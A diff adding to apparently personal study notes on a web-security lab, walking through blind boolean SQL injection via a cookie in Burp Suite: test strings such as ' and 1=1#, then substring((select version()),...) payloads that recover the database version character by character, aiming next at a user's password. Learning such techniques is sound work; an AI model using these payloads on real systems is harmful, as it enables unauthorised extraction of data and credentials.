@@ -1866,6 +1866,7 @@ What can we do now:
 
 
 
+
 in this case -->  let's see what the application can offer more
 =>
 go back to the Proxy > HTTP History
@@ -1885,4 +1886,39 @@ as you can see:
 - try to add to the cookie -->  `' and 1=1#`
   ![[Pasted image 20240307131833.png]]
 - the length doesn't change =>  this can be a sign that there is a potential SQL injection
-  
+
+NOW:
+we need to create an injection that can be replied with -->  Yes/No
+to do that we can use:
+sql `substring` function -->  substring('word', 1, 2)
+                         it takes 3 parameters:
+                         - a word 
+                         - the index inside the word
+                         - how many letters you want to extract
+                         =>
+                         in this case `substring('word', 1, 2)` = wo
+=>
+we can use this to craft a useful injection:
+let's make a stupid example -->  we want to find the database version
+=>
+the sql versions are usually something like this -->  7.0.1
+=>
+- let's try to add to the cookie -->  `' and substring((select version()), 1, 1) = '7'#`
+- click on Send
+	-<span style="color:#00b050"> if the server replies with</span> `Content-Length` = 1027 =>  7 is the correct version
+	- but here server replied with different length => is wrong
+- let's try with version 8 -->  `' and substring((select version()), 1, 1) = '8'#`
+	- it's correct
+- now the next Ch will probably be "." -> `' and substring((select version()), 1, 2) = '8.'#`
+	- it's correct
+- now let's try if the version is 8.0 --> `' and substring((select version()), 1, 3) = '8.0'#`
+	- it's correct
+=>
+<span style="color:#00b050">we can repeat this process until we find the version:</span>
+`' and substring((select version()), 1, 5) = '8.0.3'#`
+![[Pasted image 20240307152847.png]]
+
+Now:
+we can use this mechanism -->  to find the <span style="color:#00b050">jeremy password</span>
+
+
